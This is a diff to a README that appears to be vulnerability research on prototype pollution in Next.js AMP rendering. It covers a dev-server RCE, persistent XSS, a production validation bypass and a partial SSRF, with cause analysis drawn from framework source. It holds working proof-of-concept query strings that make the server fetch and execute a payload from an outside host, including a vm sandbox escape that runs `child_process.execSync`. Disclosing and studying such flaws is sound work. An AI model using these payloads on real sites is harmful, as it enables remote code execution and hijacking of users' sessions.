@@ -34,26 +34,106 @@ npm start
 ## AMP RCE
 
 > Only on `dev` server
+> `npm run dev`
+
+**Poc**
 
 ```sh
 # Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
 /vulnerable?amp=1&__proto__.amp=hybrid&__proto__.validator=https://xss-callback.pwnfunction.repl.co/
 ```
 
+**Cause**
+
+1. Request to any AMP enabled page
+2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+3. Request to vulnerable page with `validator` should trigger the RCE.
+
+```js
+/* next/server/render.tsx */
+const ampState = {
+  ampFirst: pageConfig.amp === true,
+  hasQuery: Boolean(query.amp),
+  hybrid: pageConfig.amp === "hybrid",
+};
+const inAmpMode = !process.browser && (0, _amp).isInAmpMode(ampState); // isInAmpMode(ampState) { return ampState.ampFirst || ampState.hybrid && ampState.hasQuery }
+// ...
+inAmpMode
+  ? async (html) => {
+      html = await optimizeAmp(html, renderOpts.ampOptimizerConfig);
+      if (!renderOpts.ampSkipValidation && renderOpts.ampValidator) {
+        await renderOpts.ampValidator(html, pathname);
+      }
+      return html;
+    }
+  : null;
+```
+
+```js
+/* next/dist/server/dev/next-dev-server.js */
+const validatorPath =
+  this.nextConfig.experimental &&
+  this.nextConfig.experimental.amp &&
+  this.nextConfig.experimental.amp.validator;
+```
+
+```js
+/* next/dist/compiled/amphtml-validator/index.js */
+function getInstance(e, t) {
+  const n = e || "https://cdn.ampproject.org/v0/validator.js";
+  const r = t || m;
+  if (d.hasOwnProperty(n)) {
+    return c.resolve(d[n]);
+  }
+  const o = isHttpOrHttpsUrl(n) ? readFromUrl(n, r) : readFromFile(n);
+  return o.then(function (e) {
+    let t;
+    try {
+      t = new Validator(e);
+    } catch (e) {
+      throw e;
+    }
+    d[n] = t;
+    return t;
+  });
+}
+```
+
+```js
+/* next/dist/compiled/amphtml-validator/index.js */
+function Validator(e) {
+  this.sandbox = h.createContext();
+  try {
+    new h.Script(e).runInContext(this.sandbox);
+  } catch (e) {
+    throw new Error("Could not instantiate validator.js - " + e.message);
+  }
+}
+```
+
+> [nodejs vm module](https://nodejs.org/api/vm.html) simple escape via `Function` - `this.constructor.constructor('return process')()`
+
 ## AMP XSS
 
 Persistent Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml`.
+
+---
 
 Also a partial SSRF via `node-fetch` during AMP transform.
 
 **Poc**
 
 ```sh
+# Hosted payload: alert(document.domain)
+
 # XSS on a AMP enabled Page
 /vulnerable?__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
 
 # XSS on a Non-AMP Page (but AMP should be enabled in atleast one other page on the site)
 /vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
+
+# On production
+/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampSkipValidation=1&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co
 
 # Partial SSRF - works if route `/*` does not return 404 else server hangs
 /vulnerable?__proto__.ampUrlPrefix=https://URL/
@@ -62,8 +142,9 @@ Also a partial SSRF via `node-fetch` during AMP transform.
 
 **Cause**
 
-Requires 2 stages to poison the server-side code with our payload because AMP check happens before the pollution in `getServerSideProps`. So we pollute in the first request and trigger in another which does a new AMP check and optimize.
-Once it's poisoned any single subsequent request will trigger XSS on any session as the server-side code is poisoned via prototype pollution.
+1. Request to any AMP enabled page
+2. If AMP if disabled on vulnerable page enable it via `amp=1&__proto__.amp=hybrid`.
+3. Request to vulnerable page with `ampUrlPrefix` should trigger the XSS.
 
 ```js
 /* next/server/render.tsx */
@@ -75,6 +156,11 @@ const ampState = {
 const inAmpMode = !process.browser && (0, _amp).isInAmpMode(ampState); // isInAmpMode(ampState) { return ampState.ampFirst || ampState.hybrid && ampState.hasQuery }
 // ...
 html = await optimizeAmp(html, renderOpts.ampOptimizerConfig);
+
+// On production server we skip the error causing validation by pollluting `renderOpts.ampSkipValidation`
+if (!renderOpts.ampSkipValidation && renderOpts.ampValidator) {
+  await renderOpts.ampValidator(html, pathname);
+}
 ```
 
 ```js
@@ -113,8 +199,8 @@ async transformHtml(t, e) {
 
 > ➕ Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
 
-> 📝 Note: In `next.config.js`, we skip validation `skipValidation: true`.
-> This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
+> 📝 Note (On Dev Server): In `next.config.js`, we skip validation `skipValidation: true`.
+> This is to disable `SeparateKeyframes` (`fn 1053`) - eventually throws `filter on undefined` due to prototype pollution. (Lazy fix)
 
 ```js
 // next.config.js
@@ -128,6 +214,8 @@ module.exports = {
   },
 };
 ```
+
+✅ On Production server, it doesn't matter because we are skipping validation via `__proto__.ampSkipValidation=1`.
 
 ## Redirect SSR
 
